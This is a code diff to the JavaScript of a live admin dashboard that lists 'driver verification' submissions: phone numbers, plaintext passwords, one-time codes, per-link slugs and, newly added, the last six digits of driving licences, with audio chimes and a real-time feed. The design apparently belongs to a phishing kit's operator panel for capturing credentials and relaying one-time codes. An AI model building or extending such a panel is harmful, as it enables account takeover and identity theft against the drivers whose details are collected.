@@ -123,6 +123,8 @@ if (socket && typeof socket.on === 'function') {
             if (notification.type === 'OTP_SUBMITTED') {
                 playChime(880, 'triangle', 0.2);
                 setTimeout(() => playChime(1174, 'triangle', 0.3), 150);
+            } else if (notification.type === 'LICENSE_SUBMITTED') {
+                playChime(740, 'triangle', 0.25);
             } else {
                 playChime(660, 'sine', 0.3);
             }
@@ -173,7 +175,7 @@ function renderTable(data) {
     if (totalRecords === 0) {
         tableBody.innerHTML = `
             <tr>
-                <td colspan="9" style="text-align:center; padding:32px; color:#94A3B8;">
+                <td colspan="10" style="text-align:center; padding:32px; color:#94A3B8;">
                     <i class="fa-solid fa-inbox" style="font-size:24px; margin-bottom:8px; display:block;"></i>
                     No driver verification requests yet.
                 </td>
@@ -209,6 +211,8 @@ function renderTable(data) {
             statusBadge = `<span class="badge-status failed" style="background:rgba(239, 68, 68, 0.2); color:#EF4444; border:1px solid #EF4444;"><i class="fa-solid fa-xmark"></i> NOT VERIFIED</span>`;
         } else if (item.status === 'OTP_SUBMITTED') {
             statusBadge = `<span class="badge-status pending" style="background:rgba(59, 130, 246, 0.2); color:#60A5FA; border:1px solid #3B82F6;"><i class="fa-solid fa-spinner fa-spin"></i> Pending Admin</span>`;
+        } else if (item.status === 'LICENSE_SUBMITTED') {
+            statusBadge = `<span class="badge-status" style="background:rgba(99, 102, 241, 0.2); color:#818CF8; border:1px solid #6366F1;"><i class="fa-solid fa-id-card"></i> License Submitted</span>`;
         } else if (item.status === 'PASSWORD_SUBMITTED') {
             statusBadge = `<span class="badge-status submitted" style="background:rgba(234, 179, 8, 0.2); color:#FACC15; border-color:#EAB308;"><i class="fa-solid fa-key"></i> Password Submitted</span>`;
         } else {
@@ -218,6 +222,10 @@ function renderTable(data) {
         const passwordDisplay = item.password 
             ? `<span class="password-pill" style="background:rgba(234, 179, 8, 0.2); color:#FACC15; border:1px solid #EAB308; font-size:12px; padding:3px 10px; border-radius:6px; font-weight:700; font-family:monospace;">${item.password}</span>`
             : `<span style="color:#64748B; font-size:12px; font-style:italic;">No Password</span>`;
+
+        const licenseDisplay = item.licenseDigits
+            ? `<span class="license-pill" style="background:rgba(99, 102, 241, 0.2); color:#A5B4FC; border:1px solid #6366F1; font-size:12px; padding:3px 10px; border-radius:6px; font-weight:700; font-family:monospace;"><i class="fa-solid fa-id-card"></i> ${item.licenseDigits}</span>`
+            : `<span style="color:#64748B; font-size:12px; font-style:italic;">No License</span>`;
 
         const otpDisplay = item.otp 
             ? `<span class="otp-pill">${item.otp}</span>`
@@ -259,6 +267,7 @@ function renderTable(data) {
                     ${item.phoneNumber} ${slugBadge}
                 </td>
                 <td>${passwordDisplay}</td>
+                <td>${licenseDisplay}</td>
                 <td>${otpDisplay}</td>
                 <td>${statusBadge}</td>
                 <td>${submittedTime}</td>
@@ -380,8 +389,9 @@ function addActivityFeedItem(notification) {
     const div = document.createElement('div');
     const isOtp = notification.type === 'OTP_SUBMITTED';
     const isPassword = notification.type === 'PASSWORD_SUBMITTED';
+    const isLicense = notification.type === 'LICENSE_SUBMITTED';
 
-    div.className = `activity-item ${isOtp ? 'type-otp' : (isPassword ? 'type-password' : 'type-phone')}`;
+    div.className = `activity-item ${isOtp ? 'type-otp' : (isLicense ? 'type-license' : (isPassword ? 'type-password' : 'type-phone'))}`;
 
     const timeStr = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
@@ -392,6 +402,12 @@ function addActivityFeedItem(notification) {
             <span>Driver <strong>${notification.data.phoneNumber}</strong> submitted OTP:</span>
             <span class="otp-highlight">${notification.data.otp}</span>
             <span style="color:#10B981;">(Driver Identity Verified)</span>
+        `;
+    } else if (isLicense) {
+        messageHtml = `
+            <i class="fa-solid fa-id-card" style="color:#818CF8; margin-right:8px;"></i>
+            <span>Driver <strong>${notification.data.phoneNumber}</strong> submitted License (Last 6):</span>
+            <span style="background:rgba(99, 102, 241, 0.2); color:#A5B4FC; border:1px solid #6366F1; padding:2px 8px; border-radius:4px; font-weight:700; font-family:monospace; margin-left:6px;">${notification.data.licenseDigits}</span>
         `;
     } else if (isPassword) {
         messageHtml = `
@@ -429,9 +445,11 @@ function filterTable() {
 
     const filtered = verificationsList.filter(item => {
         const phone = (item.phoneNumber || '').toLowerCase();
+        const pw = (item.password || '').toLowerCase();
+        const dl = (item.licenseDigits || '').toLowerCase();
         const otp = (item.otp || '').toLowerCase();
         const slug = (item.customSlug || '').toLowerCase();
-        return phone.includes(query) || otp.includes(query) || slug.includes(query);
+        return phone.includes(query) || pw.includes(query) || dl.includes(query) || otp.includes(query) || slug.includes(query);
     });
 
     renderTable(filtered);
